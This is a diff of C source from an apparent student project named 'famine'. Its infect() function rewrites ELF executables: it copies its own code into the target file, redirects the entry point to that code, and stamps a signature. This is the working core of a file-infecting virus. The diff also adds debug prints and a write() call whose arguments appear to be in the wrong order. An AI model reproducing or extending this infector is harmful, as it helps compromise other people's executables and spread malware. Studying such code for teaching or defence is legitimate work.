@@ -6,13 +6,15 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/25 12:37:20 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 14:29:09 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
 static bool		parsing(byte *file, elf_data *data);
+
+#define _START_SIZE	0x20
 
 //	Infects the file located at path
 //
@@ -61,11 +63,17 @@ bool	infect(profiling *this, const str path) {
 	change_note_segment(this, &data);
 
 	print_data(&data);
+
 	//	Copy the code
 	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
 	
 	//	Change the entrypoint
-	data.elf->e_entry = data.infection_offset_mem + this->size - 0x1c;
+	data.elf->e_entry = data.infection_offset_mem + this->size - _START_SIZE;
+
+	write(ret, 1, &data.elf->e_entry, 4);
+
+	printf("%lx + %lx - %x = %lx (%lx)\n", data.infection_offset_mem, this->size, _START_SIZE, data.elf->e_entry,
+		data.infection_offset_mem + this->size - _START_SIZE);
 	
 	//	Copy signature
 	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
